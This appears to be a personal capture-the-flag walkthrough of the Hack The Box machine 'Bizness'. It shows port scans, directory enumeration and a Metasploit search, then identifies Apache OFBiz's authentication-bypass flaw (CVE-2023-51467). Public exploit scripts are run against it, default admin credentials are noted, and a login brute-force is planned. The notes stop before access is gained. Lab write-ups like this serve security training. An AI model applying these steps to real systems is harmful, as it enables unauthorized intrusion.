---
description: https://app.hackthebox.com/machines/Bizness
---

# Bizness



```
-[Tue Feb 27-13:52:38]-[table@parrot]-
-[~]$ nmap -sV -sC -T5 10.10.11.252 -p-
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-27 13:55 PST
Warning: 10.10.11.252 giving up on port because retransmission cap hit (2).
Nmap scan report for bizness.htb (10.10.11.252)
Host is up (0.075s latency).
Not shown: 64877 closed tcp ports (conn-refused), 654 filtered tcp ports (no-response)
PORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
| ssh-hostkey: 
|   3072 3e:21:d5:dc:2e:61:eb:8f:a6:3b:24:2a:b7:1c:05:d3 (RSA)
|   256 39:11:42:3f:0c:25:00:08:d7:2f:1b:51:e0:43:9d:85 (ECDSA)
|_  256 b0:6f:a0:0a:9e:df:b1:7a:49:78:86:b2:35:40:ec:95 (ED25519)
80/tcp    open  http       nginx 1.18.0
|_http-server-header: nginx/1.18.0
|_http-title: Did not follow redirect to https://bizness.htb/
443/tcp   open  ssl/http   nginx 1.18.0
|_http-trane-info: Problem with XML parsing of /evox/about
|_ssl-date: TLS randomness does not represent time
|_http-title: BizNess Incorporated
| ssl-cert: Subject: organizationName=Internet Widgits Pty Ltd/stateOrProvinceName=Some-State/countryName=UK
| Not valid before: 2023-12-14T20:03:40
|_Not valid after:  2328-11-10T20:03:40
| tls-nextprotoneg: 
|_  http/1.1
|_http-server-header: nginx/1.18.0
| tls-alpn: 
|_  http/1.1
35339/tcp open  tcpwrapped
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 342.32 seconds

```

msf attempts on nginx unsuccessful

```
[msf](Jobs:0 Agents:0) >> search nginx

Matching Modules
================

   #  Name                                            Disclosure Date  Rank       Check  Description
   -  ----                                            ---------------  ----       -----  -----------
   0  exploit/linux/http/nginx_chunked_size           2013-05-07       great      Yes    Nginx HTTP Server 1.3.9-1.4.0 Chunked Encoding Stack Buffer Overflow
   1  auxiliary/scanner/http/nginx_source_disclosure                   normal     No     Nginx Source Code Disclosure/Download
   2  exploit/multi/http/php_fpm_rce                  2019-10-22       normal     Yes    PHP-FPM Underflow RCE
   3  exploit/linux/http/roxy_wi_exec                 2022-07-06       excellent  Yes    Roxy-WI Prior to 6.1.1.0 Unauthenticated Command Injection RCE


Interact with a module by name or index. For example info 3, use 3 or use exploit/linux/http/roxy_wi_exec
```

Cant access the web page at `https://10.10.11.252/`\
Edited `/etc/hosts` to include \
`10.10.11.252            bizness.htb`

Whatweb for services on website

```
-[Tue Feb 27-13:30:41]-[table@parrot]-
-[~]$ whatweb http://bizness.htb/
http://bizness.htb/ [301 Moved Permanently] Country[RESERVED][ZZ], HTTPServer[nginx/1.18.0], IP[10.10.11.252], RedirectLocation[https://bizness.htb/], Title[301 Moved Permanently], nginx[1.18.0]
https://bizness.htb/ [200 OK] Bootstrap, Cookies[JSESSIONID], Country[RESERVED][ZZ], Email[info@bizness.htb], HTML5, HTTPServer[nginx/1.18.0], HttpOnly[JSESSIONID], IP[10.10.11.252], JQuery, Lightbox, Script, Title[BizNess Incorporated], nginx[1.18.0]
```

Gobuster initial

```
-[Tue Feb 27-13:59:23]-[table@parrot]-
-[~]$ gobuster dir -u  http://10.10.11.252 --wordlist /usr/share/dirb/wordlists/common.txt -b 301
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.11.252
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirb/wordlists/common.txt
[+] Negative Status codes:   301
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
Progress: 4614 / 4615 (99.98%)
===============================================================
Finished
===============================================================

```

Dirsearch

```
-[Tue Feb 27-14:04:24]-[table@parrot]-
-[~]$ dirsearch -u 10.10.11.252

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927

Output File: /home/table/.dirsearch/reports/10.10.11.252_24-02-27_14-04-34.txt

Error Log: /home/table/.dirsearch/logs/errors-24-02-27_14-04-34.log

Target: http://10.10.11.252/

[14:04:34] Starting: 
[14:04:53] 301 -  169B  - /examples/jsp/%252e%252e/%252e%252e/manager/html/  ->  https://bizness.htb/examples/jsp/%252e%252e/%252e%252e/manager/html/

Task Completed

```



Nikto

```
-[Tue Feb 27-14:46:16]-[table@parrot]-
-[~]$ nikto -h http://bizness.htb
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          10.10.11.252
+ Target Hostname:    bizness.htb
+ Target Port:        80
+ Start Time:         2024-02-27 14:46:25 (GMT-8)
---------------------------------------------------------------------------
+ Server: nginx/1.18.0
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ Root page / redirects to: https://bizness.htb/
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ 7962 requests: 0 error(s) and 2 item(s) reported on remote host
+ End Time:           2024-02-27 14:56:51 (GMT-8) (626 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested

```

Ffuf

```
-[Tue Feb 27-15:03:47]-[table@parrot]-
-[~]$ ffuf -w /usr/share/dirb/wordlists/common.txt -u http://bizness.htb/FUZZ -t 50 -mc 200

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.0.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://bizness.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/dirb/wordlists/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 50
 :: Matcher          : Response status: 200
________________________________________________

:: Progress: [4614/4614] :: Job [1/1] :: 639 req/sec :: Duration: [0:00:07] :: Errors: 0 ::


```

Wfuzz

```
Total time: 34.83259
Processed Requests: 4614
Filtered Requests: 0
Requests/sec.: 132.4621

```

Dirb

```
-[Tue Feb 27-15:00:35]-[table@parrot]-
-[~]$ dirb http://bizness.htb /usr/share/dirb/wordlists/common.txt  -f

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Tue Feb 27 15:00:43 2024
URL_BASE: http://bizness.htb/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
OPTION: Fine tunning of NOT_FOUND detection

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://bizness.htb/ ----
                                                                                                                            
-----------------
END_TIME: Tue Feb 27 15:06:26 2024
DOWNLOADED: 4612 - FOUND: 0

```

No luck

Nginx in nmap but noticed Apahce OFBiz Powers the website at the footer

* what is Apache OFBiz?
  * CVE-2023-51467
  * The vulnerability permits attackers to circumvent authentication processes, enabling them to remotely execute arbitrary code

{% embed url="https://github.com/Chocapikk/CVE-2023-51467" %}

```
-[~/.venv/CVE-2023-51467]$ python exploit.py -u http://bizness.htb
[18:58:49] Vulnerable URL found: http://bizness.htb, Response: PONG                                              exploit.py:53
|████████████████████████████████████████| 1/1 [100%] in 1.1s (0.90/s) 

```

It is vulnerable bc PONG

now to exploit

Found another github with scanner and exploit python script

{% embed url="https://github.com/jakabakos/Apache-OFBiz-Authentication-Bypass" %}

```
[Tue Feb 27-19:08:01]-[table@parrot]-
-[~/Apache-OFBiz-Authentication-Bypass]$ python3 exploit.py --url https://bizness.htb:443 --cmd 'CMD'
[+] Generating payload...
[+] Payload generated successfully.
[+] Sending malicious serialized payload...
[+] The request has been successfully sent. Check the result of the command.

```

in exploit i noticed the script was running to the /webtools/control/main in Apache OFBiz

I see this on https://bizness.htb/webtools/control/main



```
    Web Tools Main Page
    default


For something interesting make sure you are logged in, try username: admin, password: ofbiz.

NOTE: If you have not already run the installation data loading script, from the ofbiz home directory run "gradlew loadAll" or "java -jar build/libs/ofbiz.jar -l"

Login

```

admin:ofbiz does not work

&#x20;in BurpSuite maybe I can see something in Repeater or do something to login

may need the user access first...

Dirbuster, dirsearch, nikto, fuff, wfuzz again with ../webstools/control/ and nothing

Finally had to get a big hint on why my directory enumeration was not working. Here is the TRUE way to use dirsearch

```
-[~]$ dirsearch -u https://bizness.htb/ --exclude-status 403,404,500,502,400,401

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927

Output File: /home/table/.dirsearch/reports/bizness.htb/-_24-02-27_19-31-40.txt

Error Log: /home/table/.dirsearch/logs/errors-24-02-27_19-31-40.log

Target: https://bizness.htb/

[19:31:40] Starting: 
[19:31:50] 302 -    0B  - /accounting  ->  https://bizness.htb/accounting/
[19:31:57] 302 -    0B  - /catalog  ->  https://bizness.htb/catalog/
[19:31:58] 302 -    0B  - /common  ->  https://bizness.htb/common/
[19:31:58] 302 -    0B  - /content  ->  https://bizness.htb/content/
[19:31:58] 302 -    0B  - /content/debug.log  ->  https://bizness.htb/content/control/main
[19:31:58] 302 -    0B  - /content/  ->  https://bizness.htb/content/control/main
[19:31:59] 200 -   34KB - /control
[19:31:59] 200 -   34KB - /control/
[19:32:01] 302 -    0B  - /error  ->  https://bizness.htb/error/;jsessionid=C12B0E82503A29488FA406B5A2B35958.jvm1
[19:32:01] 302 -    0B  - /example  ->  https://bizness.htb/example/
[19:32:03] 302 -    0B  - /images  ->  https://bizness.htb/images/
[19:32:04] 302 -    0B  - /index.jsp  ->  https://bizness.htb/control/main
[19:32:04] 200 -   27KB - /index.html
[19:32:13] 200 -   21B  - /solr/admin/file/?file=solrconfig.xml
[19:32:14] 200 -   21B  - /solr/admin/

Task Completed

```

Now back to figuring out how to login

can use burpsuite intruder tab to brute force the login

{% embed url="https://bizness.htb/accounting/control/login" %}

